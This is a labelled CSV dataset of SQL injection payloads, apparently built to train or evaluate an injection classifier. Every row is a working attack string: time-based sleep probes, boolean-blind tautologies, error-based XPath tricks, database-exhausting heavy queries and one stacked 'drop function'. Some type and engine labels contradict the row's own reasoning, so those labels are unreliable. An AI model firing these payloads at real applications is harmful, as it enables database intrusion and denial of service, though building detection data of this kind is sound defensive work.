id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18754,"1%"" rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",boolean_blind,mysql,0.9,'rlike' -> boolean_blind (P3): RLIKE is MySQL regex boolean | 'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,3
18755,end and ( ( 6874 = 6874,boolean_blind,generic,0.85,'AND/OR N=N' -> boolean_blind (P3): AND/OR N=N numeric tautology for boolean blind | db_engine=generic,2
18756,"-2122"" ) as zytb where 7025 = 7025 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",boolean_blind,oracle,0.9,'case when' -> boolean_blind (P3): CASE WHEN conditional select for boolean blind | db_engine=oracle,3
18757,1' ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( 'wuux' = 'wuux,boolean_blind,mysql,0.9,'rlike' -> boolean_blind (P3): RLIKE is MySQL regex boolean | 'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,3
18758,"1' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",heavy_query,oracle,0.8,'all_users t1..t5' -> heavy_query (P4): Cartesian join over all_users t1..t5 is Oracle heavy query | db_engine=oracle,1
18759,"1%' ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( '%' = '",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18760,1' and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ),boolean_blind,oracle,0.9,'case when' -> boolean_blind (P3): CASE WHEN conditional select for boolean blind | db_engine=oracle,3
18761,"1 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18762,"1 ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 3814 = 3814",boolean_blind,firebird,0.9,"'AND/OR N=N' -> boolean_blind (P3): AND/OR N=N numeric tautology for boolean blind | 'count(*) from T t1,T t2,T t3' -> heavy_query (P4): count(*) over 3+ self-joined tables creates cartesian heavy query | db_engine=firebird",3
18763,"1 ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.8,"'count(*) from T t1,T t2,T t3' -> heavy_query (P4): count(*) over 3+ self-joined tables creates cartesian heavy query | db_engine=db2",1
18764,select ( case when ( 9299 = 2760 ) then 1 else 9299* ( select 9299 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.9,'master..sysdatabases' -> boolean_blind (P3): master..sysdatabases used in CASE WHEN for MSSQL boolean blind | db_engine=mssql,3
18765,"1'+ ( select 'zkuf' where 3591 = 3591 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) +'",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18766,"1%"" or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,firebird,0.8,"'count(*) from T t1,T t2,T t3' -> heavy_query (P4): count(*) over 3+ self-joined tables creates cartesian heavy query | db_engine=firebird",1
18767,"1' ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 'dqjq' = 'dqjq",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'extractvalue(' -> error_based (P4): extractvalue() triggers MySQL XPath error | db_engine=mysql,2
18768,"1%' or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and '%' = '",heavy_query,oracle,0.8,'AND/OR 'x'='x'' -> boolean_blind (P3): AND/OR string equality tautology for boolean blind | 'all_users t1..t5' -> heavy_query (P4): Cartesian join over all_users t1..t5 is Oracle heavy query | db_engine=oracle,1
18769,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( '%' = '",heavy_query,firebird,0.8,"'rdb$fields,rdb$types' -> heavy_query (P4): Firebird heavy query joining rdb$fields and rdb$types | db_engine=firebird",1
18770,"1%"" ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18771,"1' ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 'nopu' = 'nopu",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | db_engine=mysql,2
18772,"1' ) ) as rxhe where 3838 = 3838 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.8,"'count(*) from T t1,T t2,T t3' -> heavy_query (P4): count(*) over 3+ self-joined tables creates cartesian heavy query | db_engine=db2",1
18773,"1' ) as wnyl where 8978 = 8978 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.8,'all_users t1..t5' -> heavy_query (P4): Cartesian join over all_users t1..t5 is Oracle heavy query | db_engine=oracle,1
18774,"1' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",heavy_query,firebird,0.8,"'rdb$fields,rdb$types' -> heavy_query (P4): Firebird heavy query joining rdb$fields and rdb$types | db_engine=firebird",1
18775,"1%"" and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ""%"" = """,boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'UNION SELECT (x3)' -> union_based (P7): Detected 3 UNION SELECT clause(s) for data extraction | db_engine=mysql,2
18776,"1%"" or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""%"" = """,heavy_query,oracle,0.8,"'""x""=""x""' -> boolean_blind (P3): Double-quoted string equality tautology for boolean blind | 'all_users t1..t5' -> heavy_query (P4): Cartesian join over all_users t1..t5 is Oracle heavy query | db_engine=oracle",1
18777,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""%"" = """,boolean_blind,firebird,0.9,"'""x""=""x""' -> boolean_blind (P3): Double-quoted string equality tautology for boolean blind | 'rdb$fields,rdb$types' -> heavy_query (P4): Firebird heavy query joining rdb$fields and rdb$types | db_engine=firebird",3
18778,"1%"" ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ""%"" = """,boolean_blind,firebird,0.9,"'""x""=""x""' -> boolean_blind (P3): Double-quoted string equality tautology for boolean blind | 'rdb$fields,rdb$types' -> heavy_query (P4): Firebird heavy query joining rdb$fields and rdb$types | db_engine=firebird",3
18779,"1'+ ( select fhbk where 2570 = 2570 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) +'",heavy_query,oracle,0.8,'all_users t1..t5' -> heavy_query (P4): Cartesian join over all_users t1..t5 is Oracle heavy query | db_engine=oracle,1
18780,"1%"" ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ""%"" = """,heavy_query,generic,0.9,"'""x""=""x""' -> boolean_blind (P3): Double-quoted string equality tautology for boolean blind | 'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18781,"1 and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,2
18782,"1"" and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ""rntg"" like ""rntg",boolean_blind,firebird,0.9,"'""x"" LIKE ""x""' -> boolean_blind (P3): Double-quoted-string LIKE tautology for boolean blind | 'count(*) from T t1,T t2,T t3' -> heavy_query (P4): count(*) over 3+ self-joined tables creates cartesian heavy query | db_engine=firebird",3
18783,"1' ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( 'wdru' like 'wdru",heavy_query,generic,0.9,"''x' LIKE 'x'' -> boolean_blind (P3): Quoted-string LIKE tautology for boolean blind | 'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18784,"1%' ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( '%' = '",boolean_blind,firebird,0.9,"'AND/OR 'x'='x'' -> boolean_blind (P3): AND/OR string equality tautology for boolean blind | 'rdb$fields,rdb$types' -> heavy_query (P4): Firebird heavy query joining rdb$fields and rdb$types | db_engine=firebird",3
18785,"1 ) ) as rpwt where 4103 = 4103 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,firebird,0.8,"'count(*) from T t1,T t2,T t3' -> heavy_query (P4): count(*) over 3+ self-joined tables creates cartesian heavy query | db_engine=firebird",1
18786,"1 ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18787,"1 where 5081 = 5081 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18788,"1"" ) ) as vxkn where 2443 = 2443 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.75,'sysusers x N' -> heavy_query (P4): Cartesian join of sysusers aliases for MSSQL heavy query | db_engine=mssql,1
18789,select ( case when ( 5009 = 1133 ) then 5009 else 5009* ( select 5009 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.85,'case when' -> boolean_blind (P3): CASE WHEN conditional select for boolean blind | db_engine=mysql,3
18790,"1 ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( 1782 = 1782",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'UNION SELECT (x3)' -> union_based (P7): Detected 3 UNION SELECT clause(s) for data extraction | db_engine=mysql,2
18791,"1"" ) as evoq where 8193 = 8193 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18792,-5291' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'tmpm' = 'tmpm,boolean_blind,oracle,0.9,'case when' -> boolean_blind (P3): CASE WHEN conditional select for boolean blind | db_engine=oracle,3
18793,"1 ) as wxms where 7272 = 7272 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.8,"'count(*) from T t1,T t2,T t3' -> heavy_query (P4): count(*) over 3+ self-joined tables creates cartesian heavy query | db_engine=db2",1
18794,1 ) where 7552 = 7552 order by 1#,boolean_blind,generic,0.85,'order by N --/#' -> boolean_blind (P3): ORDER BY N with comment terminator is column-count probing for boolean blind | db_engine=generic,2
18795,1'|| ( select 'tznb' from dual where 8808 = 8808 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,boolean_blind,oracle,0.9,'rlike' -> boolean_blind (P3): RLIKE is MySQL regex boolean | 'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=oracle,3
18796,-2174' ) ) as zhoz where 4185 = 4185 order by 1#,boolean_blind,generic,0.85,'order by N --/#' -> boolean_blind (P3): ORDER BY N with comment terminator is column-count probing for boolean blind | db_engine=generic,2
18797,"1'|| ( select 'jlka' where 5436 = 5436 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,firebird,0.8,"'count(*) from T t1,T t2,T t3' -> heavy_query (P4): count(*) over 3+ self-joined tables creates cartesian heavy query | db_engine=firebird",1
18798,"1' ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ( 'gwew' like 'gwew",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'updatexml(' -> error_based (P4): updatexml() triggers MySQL XPath error | db_engine=mysql,2
18799,"1"" where 5440 = 5440 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.8,"'count(*) from T t1,T t2,T t3' -> heavy_query (P4): count(*) over 3+ self-joined tables creates cartesian heavy query | db_engine=db2",1
18800,"1%"" and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.8,"'count(*) from T t1,T t2,T t3' -> heavy_query (P4): count(*) over 3+ self-joined tables creates cartesian heavy query | db_engine=db2",1
18801,"1' ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 'wzdo' = 'wzdo",boolean_blind,mysql,0.85,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | db_engine=mysql,2
18802,1' ) ) as vdhw where 8858 = 8858 order by 1#,boolean_blind,generic,0.85,'order by N --/#' -> boolean_blind (P3): ORDER BY N with comment terminator is column-count probing for boolean blind | db_engine=generic,2
18803,-5555 ) ) as ldte where 4583 = 4583 order by 1#,boolean_blind,generic,0.85,'order by N --/#' -> boolean_blind (P3): ORDER BY N with comment terminator is column-count probing for boolean blind | db_engine=generic,2
18804,-1886' where 5518 = 5518 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,boolean_blind,oracle,0.8,'case when' -> boolean_blind (P3): CASE WHEN conditional select for boolean blind | 'utl_inaddr' -> error_based (P4): utl_inaddr.get_host_address is Oracle error/OOB | db_engine=oracle,1
18805,"1%"" ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,firebird,0.8,"'count(*) from T t1,T t2,T t3' -> heavy_query (P4): count(*) over 3+ self-joined tables creates cartesian heavy query | db_engine=firebird",1
18806,"1' ) ) as atpy where 9020 = 9020 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,firebird,0.8,"'count(*) from T t1,T t2,T t3' -> heavy_query (P4): count(*) over 3+ self-joined tables creates cartesian heavy query | db_engine=firebird",1
18807,"1%' ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.75,'sysusers x N' -> heavy_query (P4): Cartesian join of sysusers aliases for MSSQL heavy query | db_engine=mssql,1
18808,"1%' ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.8,"'rdb$fields,rdb$types' -> heavy_query (P4): Firebird heavy query joining rdb$fields and rdb$types | db_engine=firebird",1
18809,"1"" ) where 5129 = 5129 order by 1--",boolean_blind,generic,0.85,'order by N --/#' -> boolean_blind (P3): ORDER BY N with comment terminator is column-count probing for boolean blind | db_engine=generic,2
18810,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( 'fnon' like 'fnon",boolean_blind,firebird,0.9,"''x' LIKE 'x'' -> boolean_blind (P3): Quoted-string LIKE tautology for boolean blind | 'count(*) from T t1,T t2,T t3' -> heavy_query (P4): count(*) over 3+ self-joined tables creates cartesian heavy query | db_engine=firebird",3
18811,"1"" ) as vcir where 6275 = 6275 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18812,"1' ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( 'ygfv' = 'ygfv",heavy_query,firebird,0.8,"'count(*) from T t1,T t2,T t3' -> heavy_query (P4): count(*) over 3+ self-joined tables creates cartesian heavy query | db_engine=firebird",1
18813,"1'|| ( select 'wqmz' where 6400 = 6400 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) ) ||'",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'UNION SELECT (x3)' -> union_based (P7): Detected 3 UNION SELECT clause(s) for data extraction | db_engine=mysql,2
18814,"1, ( select * from generate_series ( 5609,5609,case when ( 5609 = 5609 ) then 1 else 0 end ) limit 1 )",heavy_query,postgresql,0.8,'case when' -> boolean_blind (P3): CASE WHEN conditional select for boolean blind | 'generate_series(' -> heavy_query (P4): generate_series() in PostgreSQL builds heavy query | db_engine=postgresql,1
18815,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ""swec"" like ""swec",heavy_query,oracle,0.8,"'""x"" LIKE ""x""' -> boolean_blind (P3): Double-quoted-string LIKE tautology for boolean blind | 'all_users t1..t5' -> heavy_query (P4): Cartesian join over all_users t1..t5 is Oracle heavy query | db_engine=oracle",1
18816,"1' in boolean mode ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) #",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18817,1%' ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,boolean_blind,mysql,0.9,'rlike' -> boolean_blind (P3): RLIKE is MySQL regex boolean | 'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,3
18818,"1 where 2674 = 2674 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,firebird,0.8,"'count(*) from T t1,T t2,T t3' -> heavy_query (P4): count(*) over 3+ self-joined tables creates cartesian heavy query | db_engine=firebird",1
18819,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 8503 = 8503",heavy_query,generic,0.9,"'AND/OR N=N' -> boolean_blind (P3): AND/OR N=N numeric tautology for boolean blind | 'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18820,if ( 9431 = 6730 ) select 9431 else drop function xbkh--,stacked_queries,generic,0.7,'drop function' -> stacked_queries (P8): DROP FUNCTION inside ELSE branch is stacked DDL | db_engine=generic,1
18821,"1%' ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18822,select ( case when ( 9931 = 3424 ) then 1 else 9931* ( select 9931 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.9,'master..sysdatabases' -> boolean_blind (P3): master..sysdatabases used in CASE WHEN for MSSQL boolean blind | db_engine=mssql,3
